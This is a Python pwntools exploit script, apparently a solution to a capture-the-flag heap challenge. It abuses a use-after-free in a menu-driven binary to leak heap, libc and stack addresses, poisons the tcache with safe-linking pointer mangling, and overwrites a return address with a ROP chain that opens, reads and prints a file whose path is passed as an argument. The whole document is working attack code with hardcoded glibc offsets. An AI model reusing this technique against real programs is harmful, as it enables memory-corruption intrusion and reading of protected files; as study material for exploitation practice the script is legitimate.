from pwn import *
import sys

def add(idx, size):
  p.sendafter(b':> ', '1'.encode())
  p.sendafter(b':> ', str(idx).encode())
  p.sendafter(b':> ', str(size).encode())

def edit(idx, data):
  p.sendafter(b':> ', '2'.encode())
  p.sendafter(b':> ', str(idx).encode())
  p.sendafter(b':> ', data)

def view(idx):
  p.sendafter(b':> ', '3'.encode())
  p.sendafter(b':> ', str(idx).encode())

def delete(idx):
  p.sendafter(b':> ', '4'.encode())
  p.sendafter(b':> ', str(idx).encode())

def mangle(v, heapbase):
  return v ^ (heapbase >> 12)

if len(sys.argv) != 3:
  print('python3 ex.py [execute path] [file path]')
  exit(1)

context.log_level = 'error'

p = process(sys.argv[1])


add(3, 0x100)
add(4, 0x100)
delete(3)
view(3)

leak = u64(p.recv(8))
heapbase = (leak << 12) #- 0x3000
log.info('[HEAP] 0x%x' % heapbase)

add(1, 0x500)
add(2, 0x500)
add(15, 0x10)
delete(1)
delete(2)

view(1)
leak = u64(p.recv(8))
libcbase = leak - 0x219ce0
log.info('[LIBC] 0x%x' % libcbase)

target = libcbase + 0x221200
delete(4)
edit(4, p64(mangle(target, heapbase)))
# 0x1de710
add(6, 0x100)
add(7, 0x100)
view(7)

stack = u64(p.recv(8))
ret = stack - 0x120
log.info('[RET] 0x%x' % ret)

add(10, 0x150)
add(11, 0x150)
delete(10)
delete(11)
edit(11, p64(mangle(ret & 0xfffffffffffffff0, heapbase - 0x1000)))

add(12, 0x150)
add(13, 0x150)

poprdi = libcbase + 0x000000000002a3e5
poprsi = libcbase + 0x000000000002be51
poprdx_rbx = libcbase + 0x0000000000090529
poprax = libcbase + 0x0000000000045eb0

read = libcbase + 0x114980
syscall = libcbase + 0x114990
write = libcbase + 0x114a20

pay = p64(poprdi) + p64(0)
pay += p64(poprsi) + p64(heapbase)
pay += p64(poprdx_rbx) + p64(0x100) + p64(0)
pay += p64(read)

pay += p64(poprdi) + p64(heapbase)
pay += p64(poprsi) + p64(0)
pay += p64(poprax) + p64(2)
pay += p64(syscall)

pay += p64(poprdi) + p64(3)
pay += p64(poprsi) + p64(heapbase)
pay += p64(poprdx_rbx) + p64(0x100) + p64(0)
pay += p64(read)

pay += p64(poprdi) + p64(1)
pay += p64(poprsi) + p64(heapbase)
pay += p64(poprdx_rbx) + p64(0x100) + p64(0)
pay += p64(write)
edit(13, b'a'*8 + pay)

p.sendafter(b':> ', b'0')
sleep(0.1)
p.send(sys.argv[2].encode() + b'\x00')

print(p.recv(0x100))